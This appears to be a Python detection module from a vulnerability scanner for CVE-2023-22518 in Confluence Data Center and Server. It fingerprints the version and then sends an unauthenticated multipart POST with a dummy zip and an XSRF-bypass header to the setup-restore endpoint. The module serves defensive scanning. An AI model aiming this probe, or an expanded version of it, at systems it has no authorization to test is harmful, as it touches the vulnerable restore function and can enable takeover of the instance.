"""Agent Asteroid implementation for CVE-2023-22518"""

import io
import re
from urllib import parse as urlparse

from packaging import version
from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = (
    "Improper Authorization Vulnerability In Confluence Data Center and Server"
)
VULNERABILITY_REFERENCE = "CVE-2023-22518"
VULNERABILITY_DESCRIPTION = (
    "All versions of Confluence Data Center and Server are affected by this vulnerability. "
    "This Improper Authorization vulnerability allows an unauthenticated attacker to reset Confluence and "
    "create a Confluence instance administrator account. Using this account, an attacker can then perform "
    "all administrative actions that are available to Confluence instance administrator leading to - "
    "but not limited to - full loss of confidentiality, integrity and availability.  Atlassian Cloud sites "
    "are not affected by this vulnerability. If your Confluence site is accessed via an atlassian.net domain, "
    "it is hosted by Atlassian and is not vulnerable to this issue."
)
REFERENCES = {
    "confluence.atlassian.com": "https://confluence.atlassian.com/security/cve-2023-22518-improper-authorization-"
    "vulnerability-in-confluence-data-center-and-server-1311473907.html",
    "github.com": "https://github.com/0x0d3ad/CVE-2023-22518",
}
RISK_RATING = "CRITICAL"

DEFAULT_TIMEOUT = 90
HEADERS = {"X-Atlassian-Token": "no-check"}
VERSION_PATTERN = re.compile(r'<meta\s+name="ajs-version-number"\s+content="([^"]+)">')
ACCEPT_ENDPOINT = (
    "/login.action?os_destination=%2Findex.action&permissionViolation=true"
)
CHECK_ENDPOINT = "/json/setup-restore.action?synchronous=true"
VULNERABLE_VERSION_RANGES = [
    (version.parse("8.0.0"), version.parse("8.3.2")),
    (version.parse("8.4.0"), version.parse("8.4.2")),
    (version.parse("8.5.0"), version.parse("8.5.1")),
]


@exploits_registry.register
class CVE202322518Exploit(definitions.Exploit):
    """CVE-2023-22518: Improper Authorization Vulnerability In Confluence Data Center and Server"""

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        references=REFERENCES,
        risk_rating=RISK_RATING,
        targeted_by_malware=True,
        targeted_by_ransomware=True,
        targeted_by_nation_state=True,
        cve_ids=["CVE-2023-22518"],
    )

    def accept(self, target: definitions.Target) -> bool:
        try:
            resp = self.session.get(
                urlparse.urljoin(target.origin, ACCEPT_ENDPOINT),
                timeout=DEFAULT_TIMEOUT,
            )
        except requests_exceptions.RequestException:
            return False
        version_match = VERSION_PATTERN.search(resp.text)
        if version_match is None:
            return False
        target_version = version.parse(version_match.group(1))
        for version_range in VULNERABLE_VERSION_RANGES:
            lower_version, upper_version = version_range
            if lower_version <= target_version <= upper_version:
                return True
        return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        files = {
            "buildIndex": (None, "false"),
            "edit": (None, "Upload and import"),
            "file": ("ZIP_DATA", io.BytesIO(b"\x00"), "application/zip"),
        }
        try:
            resp = self.session.post(
                urlparse.urljoin(target.origin, CHECK_ENDPOINT),
                files=files,
                headers=HEADERS,
            )
        except requests_exceptions.RequestException:
            return []

        if resp.status_code == 200:
            vulnerability = self.create_vulnerability(target)
            return [vulnerability]
        else:
            return []
